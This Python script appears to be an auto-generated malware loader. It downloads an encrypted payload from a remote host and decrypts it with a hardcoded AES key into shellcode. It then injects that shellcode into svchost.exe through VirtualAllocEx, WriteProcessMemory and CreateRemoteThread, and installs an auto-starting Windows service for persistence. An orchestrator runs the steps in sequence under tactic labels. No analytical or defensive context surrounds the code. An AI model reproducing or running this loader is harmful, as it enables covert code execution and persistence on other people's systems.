#!/usr/bin/env python3
import sys, json, time, requests, ctypes, psutil, subprocess
from typing import Dict, Any
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from ctypes import wintypes

# Constants
PROCESS_ALL_ACCESS = 0x1F0FFF

# Windows API functions
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
OpenProcess = kernel32.OpenProcess
OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
OpenProcess.restype = wintypes.HANDLE

VirtualAllocEx = kernel32.VirtualAllocEx
VirtualAllocEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
VirtualAllocEx.restype = wintypes.LPVOID

WriteProcessMemory = kernel32.WriteProcessMemory
WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
WriteProcessMemory.restype = wintypes.BOOL

CreateRemoteThread = kernel32.CreateRemoteThread
CreateRemoteThread.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPVOID, wintypes.LPVOID, wintypes.LPVOID, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)]
CreateRemoteThread.restype = wintypes.HANDLE

CloseHandle = kernel32.CloseHandle
CloseHandle.argtypes = [wintypes.HANDLE]
CloseHandle.restype = wintypes.BOOL

def find_process_by_name(name: str) -> int:
    """Find the first process with the given name."""
    for proc in psutil.process_iter(['name', 'pid']):
        if proc.info['name'] == name:
            return proc.info['pid']
    return None

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    url = "https://192.168.1.100/payload"
    try:
        response = requests.get(url, stream=True, timeout=30)
        response.raise_for_status()  # Raise an error for bad responses

        # Download the file in chunks
        file_data = bytearray()
        for chunk in response.iter_content(8192):
            file_data.extend(chunk)

        # Verify the file exists and size > 0
        if len(file_data) > 0:
            result = {
                'data': file_data.hex(),
                'url': url
            }
            return {'success': True, 'data': result,
                    'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
        else:
            return {'success': False, 'data': {'data': '', 'url': url},
                    'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

    except Exception as e:
        return {'success': False, 'data': {'data': '', 'url': url},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Hardcoded AES key and IV (for demonstration purposes)
        aes_key = b'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10'
        aes_iv = b'\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20'
        
        # Retrieve and convert the encrypted data
        encrypted_data = bytes.fromhex(input_data.get('data', ''))
        
        # Decrypt the payload
        cipher = AES.new(aes_key, AES.MODE_CBC, aes_iv)
        decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
        
        # Prepare the result
        result = {'shellcode': decrypted_data.hex()}
        
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
    except Exception as e:
        # On failure, return partial result with shellcode as None
        return {'success': False, 'data': {'shellcode': None},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        shellcode = bytes.fromhex(input_data.get('shellcode', ''))
        pid = find_process_by_name('svchost.exe')

        if pid is None:
            pid = psutil.Process().pid  # Fallback to current process
            injection_success = False
        else:
            injection_success = True

        process_handle = OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if not process_handle:
            return {'success': False, 'data': {}, 'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

        # Allocate memory in the target process
        remote_addr = VirtualAllocEx(process_handle, None, len(shellcode), 0x3000, 0x40)
        if not remote_addr:
            CloseHandle(process_handle)
            return {'success': False, 'data': {}, 'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

        # Write shellcode to the allocated memory
        bytes_written = ctypes.c_size_t(0)
        if not WriteProcessMemory(process_handle, remote_addr, shellcode, len(shellcode), ctypes.byref(bytes_written)):
            CloseHandle(process_handle)
            return {'success': False, 'data': {}, 'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

        # Create a remote thread to execute the shellcode
        thread_id = wintypes.DWORD(0)
        if not CreateRemoteThread(process_handle, None, 0, remote_addr, None, 0, ctypes.byref(thread_id)):
            CloseHandle(process_handle)
            return {'success': False, 'data': {}, 'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

        CloseHandle(process_handle)
        return {'success': injection_success, 'data': {}, 'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}', 'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

def task_T4(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    service_name = "MyPersistentService"
    exe_path = "C:\\Path\\To\\YourExecutable.exe"
    result = {'service_name': service_name, 'registered': False}

    try:
        # Create the service
        create_cmd = ['sc', 'create', service_name, 'binPath=', exe_path, 'start=', 'auto']
        create_process = subprocess.run(create_cmd, capture_output=True, text=True)
        
        if create_process.returncode == 0:
            # Start the service
            start_cmd = ['sc', 'start', service_name]
            start_process = subprocess.run(start_cmd, capture_output=True, text=True)
            
            if start_process.returncode == 0:
                result['registered'] = True

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Download Payload [exfiltration] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Download Payload): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Download Payload): FAILED — {err}')
            failed.append('T1')
            r2 = task_T1(None)
            if r2.get('success'):
                outputs['T1'] = r2.get('data', {})
                failed.remove('T1')
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
    
    # ── T4: Establish Persistence [persistence] ──
    try:
        r = task_T4(None)
        results['T4'] = r
        if r.get('success'):
            outputs['T4'] = r.get('data', {})
            print(f'[+] T4 (Establish Persistence): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T4 (Establish Persistence): FAILED — {err}')
            failed.append('T4')
    except Exception as e:
        print(f'[!] T4 crashed: {e}')
        failed.append('T4')
        results['T4'] = {'success': False, 'error': str(e)}
    
    # ── T2: Decrypt Payload [defense-evasion] ──
    try:
        r = task_T2(outputs.get('T1', {}))
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Decrypt Payload): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Decrypt Payload): FAILED — {err}')
            failed.append('T2')
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
    
    # ── T3: Inject Shellcode [execution] ──
    try:
        r = task_T3(outputs.get('T2', {}))
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Inject Shellcode): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Inject Shellcode): FAILED — {err}')
            failed.append('T3')
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result))